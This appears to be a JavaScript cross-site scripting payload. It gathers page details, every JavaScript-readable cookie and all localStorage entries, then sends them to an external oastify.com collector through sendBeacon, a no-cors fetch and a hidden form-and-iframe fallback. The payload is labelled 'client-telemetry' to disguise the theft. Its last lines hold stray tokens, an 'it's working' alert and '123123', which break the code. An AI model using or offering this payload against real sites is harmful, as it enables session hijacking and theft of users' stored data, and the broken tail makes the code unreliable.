// Cross-origin POST without CORS: sendBeacon -> fetch(no-cors) -> hidden <form>
// Collects page context, ALL JS-accessible cookies, and ALL localStorage entries.

(function () {
  // ===================== CONFIG =====================
  const LOG_ENDPOINT = "https://edvua4ghyiamu6w1wkgjogyvgmmdacy1.oastify.com"; // <- replace with your endpoint

  // ===================== COLLECT =====================
  function collectContext() {
    return {
      ts: new Date().toISOString(),
      origin: location.origin,
      href: location.href,
      path: location.pathname,
      search: location.search,
      hash: location.hash,
      referrer: document.referrer || "",
      ua: navigator.userAgent,
      lang: navigator.language,
      platform: navigator.platform,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
      viewport: {
        w: window.innerWidth,
        h: window.innerHeight
      },
      screen: {
        w: (screen && screen.width) || null,
        h: (screen && screen.height) || null,
        dpr: window.devicePixelRatio || 1
      }
    };
  }

  function parseCookies() {
    const raw = document.cookie || "";
    if (!raw) return { raw: "", entries: [], total: 0 };
    const entries = raw.split(/;\s*/).map(entry => {
      const i = entry.indexOf("=");
      const name = i === -1 ? entry : entry.slice(0, i);
      const value = i === -1 ? "" : entry.slice(i + 1);
      // decode for readability; keep undecodable as-is
      let dec = value;
      try { dec = decodeURIComponent(value); } catch {}
      return { name, value: dec };
    });
    return { raw, entries, total: entries.length };
  }

  function collectLocalStorage() {
    const entries = [];
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        entries.push({ key, value });
      }
    } catch {
      // Access may throw in some privacy modes; leave entries empty.
    }
    return { entries, total: entries.length };
  }

  // ===================== SENDER =====================
  function postNoCors(endpoint, payloadObj) {
    const bodyStr = JSON.stringify(payloadObj);

    // 1) sendBeacon (reliable, background; no CORS needed, no response readable)
    try {
      if (navigator.sendBeacon && endpoint.startsWith("https://")) {
        const blob = new Blob([bodyStr], { type: "text/plain;charset=UTF-8" });
        if (navigator.sendBeacon(endpoint, blob)) return true;
      }
    } catch {}

    // 2) fetch(no-cors) with simple body (string). Do NOT set headers to avoid preflight.
    try {
      fetch(endpoint, {
        method: "POST",
        mode: "no-cors",
        keepalive: true,
        body: bodyStr
      }).catch(() => {});
      return true;
    } catch {}

    // 3) Hidden <form> POST into a hidden <iframe> (navigational fallback)
    try {
      const form = document.createElement("form");
      form.method = "POST";
      form.action = endpoint;
      form.style.display = "none";

      const ta = document.createElement("textarea");
      ta.name = "d"; // server reads field "d" containing JSON string
      ta.value = bodyStr;
      form.appendChild(ta);

      const iframe = document.createElement("iframe");
      iframe.name = "telemetry_sink_" + Math.random().toString(36).slice(2);
      iframe.style.display = "none";

      document.body.appendChild(iframe);
      document.body.appendChild(form);
      form.target = iframe.name;
      form.submit();

      setTimeout(() => { try { iframe.remove(); form.remove(); } catch {} }, 3000);
      return true;
    } catch {}

    return false;
  }

  // ===================== BUILD & SEND =====================
  const payload = {
    kind: "client-telemetry",
    context: collectContext(),
    cookies: parseCookies(),        // { raw, entries:[{name,value}], total }
    localStorage: collectLocalStorage() // { entries:[{key,value}], total }
  };

  postNoCors(LOG_ENDPOINT, payload)});

  alert("it's working");

  123123
  